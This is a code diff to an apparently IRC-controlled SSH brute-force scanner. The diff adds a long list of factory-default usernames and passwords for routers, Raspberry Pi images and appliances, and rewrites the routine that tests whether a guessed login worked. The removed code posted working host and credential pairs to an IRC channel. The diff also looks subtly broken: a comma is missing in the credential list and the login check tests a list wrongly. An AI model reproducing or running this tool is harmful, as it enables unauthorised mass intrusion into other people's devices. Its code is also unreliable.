@@ -28,12 +28,32 @@ max_threads     = 100
 throttle        = 0
 timeout_breaker = 3
 timeout_port    = 5
-timeout_ssh     = 5
+timeout_ssh     = 10
 
 # SSH Login Combos
 combos = OrderedDict([
     ('root',  ('root','toor','admin','changeme','pass','password','1234','12345','123456')),
     ('admin', ('1234','12345','123456','4321','9999','abc123','admin','changeme','admin123','password'))
+    ('root',      ('alien','alpine','calvin','kn1TG7psLu','logapp','openelec','pixmet2003','raspberrypi','rasplex','rootme','soho','TANDBERG','trendimsa1.0')),
+    ('admin',     ('aerohive','kn1TG7psLu','TANDBERG')),
+    ('alien',     'alien'),
+    ('bitnami',   'bitnami'),
+    ('cisco',     'cisco'),
+    ('device',    'apc'),
+    ('dpn',       'changeme'),
+    ('HPSupport', 'badg3r5'),
+    ('lp',        'lp'),
+    ('master',    'themaster01'),
+    ('osmc',      'osmc'),
+    ('pi',        'raspberry'),
+    ('plexuser',  'rasplex'),
+    ('sysadmin',  'PASS'),
+    ('toor',      'logapp'),
+    ('ubnt',      'ubnt'),
+    ('user',      ('acme','live')),
+    ('vagrant',   'vagrant'),
+    ('virl',      'VIRL'),
+    ('vyos',      'vyos')
 ])
 
 # Important Ranges (DO NOT EDIT)
@@ -201,12 +221,9 @@ def ssh_connect(hostname, username, password):
     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     try:
         ssh.connect(hostname, 22, username, password, timeout=timeout_ssh)
-        try:
-            stdin,stdout,stderr = ssh.exec_command('echo lol')
-            for line in stdout.readlines():
-                SpaggiariBot.sendmsg(channel, line)
-        except Exception as ex:
-            SpaggiariBot.sendmsg(channel, '[{0}] - Failed command execution at {1} using {2}:{3} ({4})'.format(color('-', red), hostname, username, password, ex))
+        stdin,stdout,stderr = ssh.exec_command('echo lol')
+        if 'ogin:' in stdout.readlines():
+            raise Exception('Invalid')
     except socket.timeout:
         return 1
     except:
